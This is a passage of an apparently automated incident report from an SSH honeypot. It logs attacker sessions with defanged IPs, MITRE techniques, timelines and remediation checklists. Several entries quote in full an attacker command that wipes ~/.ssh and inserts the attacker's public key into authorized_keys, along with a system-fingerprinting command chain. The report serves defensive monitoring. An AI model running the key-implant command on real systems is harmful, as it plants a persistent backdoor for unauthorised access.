- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c87191ba5f

| Field | Detail |
|---|---|
| **Source IP** | `213.194.128[.]58` |
| **First Seen** | 2026-09-19 20:40 |
| **Last Seen** | 2026-09-19 20:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:40:02` | `cowrie.session.connect` |
| `2026-09-19 20:40:02` | `cowrie.client.version` |
| `2026-09-19 20:40:03` | `cowrie.client.kex` |
| `2026-09-19 20:40:03` | `cowrie.login.success` |
| `2026-09-19 20:40:04` | `cowrie.session.params` |
| `2026-09-19 20:40:04` | `cowrie.command.input` |
| `2026-09-19 20:40:04` | `cowrie.command.failed` |
| `2026-09-19 20:40:04` | `cowrie.log.closed` |
| `2026-09-19 20:40:05` | `cowrie.session.params` |
| `2026-09-19 20:40:05` | `cowrie.command.input` |
| `2026-09-19 20:40:05` | `cowrie.session.file_download` |
| `2026-09-19 20:40:05` | `cowrie.log.closed` |
| `2026-09-19 20:40:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.194.128[.]58` to AbuseIPDB if not already reported
- [ ] Block `213.194.128[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66b851be2046

| Field | Detail |
|---|---|
| **Source IP** | `213.194.128[.]58` |
| **First Seen** | 2026-09-19 20:40 |
| **Last Seen** | 2026-09-19 20:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:40:05` | `cowrie.session.connect` |
| `2026-09-19 20:40:05` | `cowrie.client.version` |
| `2026-09-19 20:40:05` | `cowrie.client.kex` |
| `2026-09-19 20:40:06` | `cowrie.login.success` |
| `2026-09-19 20:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.194.128[.]58` to AbuseIPDB if not already reported
- [ ] Block `213.194.128[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a915aeb89dfe

| Field | Detail |
|---|---|
| **Source IP** | `213.194.128[.]58` |
| **First Seen** | 2026-09-19 20:40 |
| **Last Seen** | 2026-09-19 20:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:40:06` | `cowrie.session.connect` |
| `2026-09-19 20:40:06` | `cowrie.client.version` |
| `2026-09-19 20:40:06` | `cowrie.client.kex` |
| `2026-09-19 20:40:07` | `cowrie.login.success` |
| `2026-09-19 20:40:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.194.128[.]58` to AbuseIPDB if not already reported
- [ ] Block `213.194.128[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57e2474b76d7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:41 |
| **Last Seen** | 2026-09-19 20:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:41:05` | `cowrie.session.connect` |
| `2026-09-19 20:41:05` | `cowrie.client.version` |
| `2026-09-19 20:41:06` | `cowrie.client.kex` |
| `2026-09-19 20:41:06` | `cowrie.login.success` |
| `2026-09-19 20:41:07` | `cowrie.session.params` |
| `2026-09-19 20:41:07` | `cowrie.command.input` |
| `2026-09-19 20:41:07` | `cowrie.log.closed` |
| `2026-09-19 20:41:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f40b5d057470

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-19 20:41 |
| **Last Seen** | 2026-09-19 20:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:41:49` | `cowrie.session.connect` |
| `2026-09-19 20:41:49` | `cowrie.client.version` |
| `2026-09-19 20:41:49` | `cowrie.client.kex` |
| `2026-09-19 20:41:52` | `cowrie.login.success` |
| `2026-09-19 20:41:53` | `cowrie.session.params` |
| `2026-09-19 20:41:53` | `cowrie.command.input` |
| `2026-09-19 20:41:53` | `cowrie.command.input` |
| `2026-09-19 20:41:53` | `cowrie.command.input` |
| `2026-09-19 20:41:53` | `cowrie.command.input` |
| `2026-09-19 20:41:53` | `cowrie.command.input` |
| `2026-09-19 20:41:53` | `cowrie.command.success` |
| `2026-09-19 20:41:53` | `cowrie.command.input` |
| `2026-09-19 20:41:53` | `cowrie.command.input` |
| `2026-09-19 20:41:53` | `cowrie.command.input` |
| `2026-09-19 20:41:53` | `cowrie.command.input` |
| `2026-09-19 20:41:54` | `cowrie.log.closed` |
| `2026-09-19 20:41:56` | `cowrie.session.params` |
| `2026-09-19 20:41:56` | `cowrie.command.input` |
| `2026-09-19 20:41:56` | `cowrie.log.closed` |
| `2026-09-19 20:41:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c010e8a83b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:42 |
| **Last Seen** | 2026-09-19 20:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:42:41` | `cowrie.session.connect` |
| `2026-09-19 20:42:41` | `cowrie.client.version` |
| `2026-09-19 20:42:41` | `cowrie.client.kex` |
| `2026-09-19 20:42:41` | `cowrie.login.success` |
| `2026-09-19 20:42:42` | `cowrie.session.params` |
| `2026-09-19 20:42:42` | `cowrie.command.input` |
| `2026-09-19 20:42:42` | `cowrie.log.closed` |
| `2026-09-19 20:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3600a6cae7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-19 20:43 |
| **Last Seen** | 2026-09-19 20:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:43:46` | `cowrie.session.connect` |
| `2026-09-19 20:43:47` | `cowrie.client.version` |
| `2026-09-19 20:43:47` | `cowrie.client.kex` |
| `2026-09-19 20:43:49` | `cowrie.login.success` |
| `2026-09-19 20:43:50` | `cowrie.session.params` |
| `2026-09-19 20:43:50` | `cowrie.command.input` |
| `2026-09-19 20:43:50` | `cowrie.command.input` |
| `2026-09-19 20:43:50` | `cowrie.command.input` |
| `2026-09-19 20:43:50` | `cowrie.command.input` |
| `2026-09-19 20:43:50` | `cowrie.command.input` |
| `2026-09-19 20:43:50` | `cowrie.command.success` |
| `2026-09-19 20:43:50` | `cowrie.command.input` |
| `2026-09-19 20:43:50` | `cowrie.command.input` |
| `2026-09-19 20:43:50` | `cowrie.command.input` |
| `2026-09-19 20:43:50` | `cowrie.command.input` |
| `2026-09-19 20:43:50` | `cowrie.log.closed` |
| `2026-09-19 20:43:52` | `cowrie.session.params` |
| `2026-09-19 20:43:52` | `cowrie.command.input` |
| `2026-09-19 20:43:52` | `cowrie.log.closed` |
| `2026-09-19 20:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7837369d53e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:44 |
| **Last Seen** | 2026-09-19 20:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:44:16` | `cowrie.session.connect` |
| `2026-09-19 20:44:16` | `cowrie.client.version` |
| `2026-09-19 20:44:16` | `cowrie.client.kex` |
| `2026-09-19 20:44:16` | `cowrie.login.success` |
| `2026-09-19 20:44:17` | `cowrie.session.params` |
| `2026-09-19 20:44:17` | `cowrie.command.input` |
| `2026-09-19 20:44:17` | `cowrie.log.closed` |
| `2026-09-19 20:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0d8587d406

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]138` |
| **First Seen** | 2026-09-19 20:44 |
| **Last Seen** | 2026-09-19 20:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:44:33` | `cowrie.session.connect` |
| `2026-09-19 20:44:33` | `cowrie.client.version` |
| `2026-09-19 20:44:33` | `cowrie.client.kex` |
| `2026-09-19 20:44:33` | `cowrie.login.success` |
| `2026-09-19 20:44:34` | `cowrie.session.params` |
| `2026-09-19 20:44:34` | `cowrie.command.input` |
| `2026-09-19 20:44:34` | `cowrie.command.failed` |
| `2026-09-19 20:44:34` | `cowrie.log.closed` |
| `2026-09-19 20:44:35` | `cowrie.session.params` |
| `2026-09-19 20:44:35` | `cowrie.command.input` |
| `2026-09-19 20:44:35` | `cowrie.session.file_download` |
| `2026-09-19 20:44:35` | `cowrie.log.closed` |
| `2026-09-19 20:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]138` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ac07744779

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]138` |
| **First Seen** | 2026-09-19 20:44 |
| **Last Seen** | 2026-09-19 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:44:35` | `cowrie.session.connect` |
| `2026-09-19 20:44:35` | `cowrie.client.version` |
| `2026-09-19 20:44:36` | `cowrie.client.kex` |
| `2026-09-19 20:44:36` | `cowrie.login.success` |
| `2026-09-19 20:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]138` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65f8d49a73d8

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]138` |
| **First Seen** | 2026-09-19 20:44 |
| **Last Seen** | 2026-09-19 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:44:36` | `cowrie.session.connect` |
| `2026-09-19 20:44:36` | `cowrie.client.version` |
| `2026-09-19 20:44:37` | `cowrie.client.kex` |
| `2026-09-19 20:44:37` | `cowrie.login.success` |
| `2026-09-19 20:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]138` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aac7858b1c7

| Field | Detail |
|---|---|
| **Source IP** | `189.167.225[.]202` |
| **First Seen** | 2026-09-19 20:44 |
| **Last Seen** | 2026-09-19 20:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:44:54` | `cowrie.session.connect` |
| `2026-09-19 20:44:54` | `cowrie.client.version` |
| `2026-09-19 20:44:54` | `cowrie.client.kex` |
| `2026-09-19 20:44:55` | `cowrie.login.success` |
| `2026-09-19 20:44:55` | `cowrie.session.params` |
| `2026-09-19 20:44:55` | `cowrie.command.input` |
| `2026-09-19 20:44:55` | `cowrie.command.failed` |
| `2026-09-19 20:44:56` | `cowrie.log.closed` |
| `2026-09-19 20:44:56` | `cowrie.session.params` |
| `2026-09-19 20:44:56` | `cowrie.command.input` |
| `2026-09-19 20:44:56` | `cowrie.session.file_download` |
| `2026-09-19 20:44:56` | `cowrie.log.closed` |
| `2026-09-19 20:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.167.225[.]202` to AbuseIPDB if not already reported
- [ ] Block `189.167.225[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df6298504767

| Field | Detail |
|---|---|
| **Source IP** | `189.167.225[.]202` |
| **First Seen** | 2026-09-19 20:44 |
| **Last Seen** | 2026-09-19 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:44:56` | `cowrie.session.connect` |
| `2026-09-19 20:44:56` | `cowrie.client.version` |
| `2026-09-19 20:44:56` | `cowrie.client.kex` |
| `2026-09-19 20:44:57` | `cowrie.login.success` |
| `2026-09-19 20:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.167.225[.]202` to AbuseIPDB if not already reported
- [ ] Block `189.167.225[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c873aefbe5

| Field | Detail |
|---|---|
| **Source IP** | `189.167.225[.]202` |
| **First Seen** | 2026-09-19 20:44 |
| **Last Seen** | 2026-09-19 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:44:57` | `cowrie.session.connect` |
| `2026-09-19 20:44:57` | `cowrie.client.version` |
| `2026-09-19 20:44:57` | `cowrie.client.kex` |
| `2026-09-19 20:44:57` | `cowrie.login.success` |
| `2026-09-19 20:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.167.225[.]202` to AbuseIPDB if not already reported
- [ ] Block `189.167.225[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c26e393ef1f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-19 20:45 |
| **Last Seen** | 2026-09-19 20:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:45:40` | `cowrie.session.connect` |
| `2026-09-19 20:45:40` | `cowrie.client.version` |
| `2026-09-19 20:45:40` | `cowrie.client.kex` |
| `2026-09-19 20:45:41` | `cowrie.login.success` |
| `2026-09-19 20:45:43` | `cowrie.session.params` |
| `2026-09-19 20:45:43` | `cowrie.command.input` |
| `2026-09-19 20:45:43` | `cowrie.command.input` |
| `2026-09-19 20:45:43` | `cowrie.command.input` |
| `2026-09-19 20:45:43` | `cowrie.command.input` |
| `2026-09-19 20:45:43` | `cowrie.command.input` |
| `2026-09-19 20:45:43` | `cowrie.command.success` |
| `2026-09-19 20:45:43` | `cowrie.command.input` |
| `2026-09-19 20:45:43` | `cowrie.command.input` |
| `2026-09-19 20:45:43` | `cowrie.command.input` |
| `2026-09-19 20:45:43` | `cowrie.command.input` |
| `2026-09-19 20:45:43` | `cowrie.log.closed` |
| `2026-09-19 20:45:44` | `cowrie.session.params` |
| `2026-09-19 20:45:44` | `cowrie.command.input` |
| `2026-09-19 20:45:45` | `cowrie.log.closed` |
| `2026-09-19 20:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab0a93bb3ffd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:45 |
| **Last Seen** | 2026-09-19 20:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:45:53` | `cowrie.session.connect` |
| `2026-09-19 20:45:53` | `cowrie.client.version` |
| `2026-09-19 20:45:53` | `cowrie.client.kex` |
| `2026-09-19 20:45:53` | `cowrie.login.success` |
| `2026-09-19 20:45:54` | `cowrie.session.params` |
| `2026-09-19 20:45:54` | `cowrie.command.input` |
| `2026-09-19 20:45:54` | `cowrie.log.closed` |
| `2026-09-19 20:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6aa0eb64b67

| Field | Detail |
|---|---|
| **Source IP** | `93.99.104[.]96` |
| **First Seen** | 2026-09-19 20:46 |
| **Last Seen** | 2026-09-19 20:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:46:30` | `cowrie.session.connect` |
| `2026-09-19 20:46:30` | `cowrie.client.version` |
| `2026-09-19 20:46:30` | `cowrie.client.kex` |
| `2026-09-19 20:46:31` | `cowrie.login.success` |
| `2026-09-19 20:46:31` | `cowrie.session.params` |
| `2026-09-19 20:46:31` | `cowrie.command.input` |
| `2026-09-19 20:46:31` | `cowrie.command.failed` |
| `2026-09-19 20:46:32` | `cowrie.log.closed` |
| `2026-09-19 20:46:32` | `cowrie.session.params` |
| `2026-09-19 20:46:32` | `cowrie.command.input` |
| `2026-09-19 20:46:32` | `cowrie.session.file_download` |
| `2026-09-19 20:46:32` | `cowrie.log.closed` |
| `2026-09-19 20:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.99.104[.]96` to AbuseIPDB if not already reported
- [ ] Block `93.99.104[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8a2f58ea6ae

| Field | Detail |
|---|---|
| **Source IP** | `93.99.104[.]96` |
| **First Seen** | 2026-09-19 20:46 |
| **Last Seen** | 2026-09-19 20:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:46:32` | `cowrie.session.connect` |
| `2026-09-19 20:46:32` | `cowrie.client.version` |
| `2026-09-19 20:46:33` | `cowrie.client.kex` |
| `2026-09-19 20:46:33` | `cowrie.login.success` |
| `2026-09-19 20:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.99.104[.]96` to AbuseIPDB if not already reported
- [ ] Block `93.99.104[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30a86481e601

| Field | Detail |
|---|---|
| **Source IP** | `93.99.104[.]96` |
| **First Seen** | 2026-09-19 20:46 |
| **Last Seen** | 2026-09-19 20:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
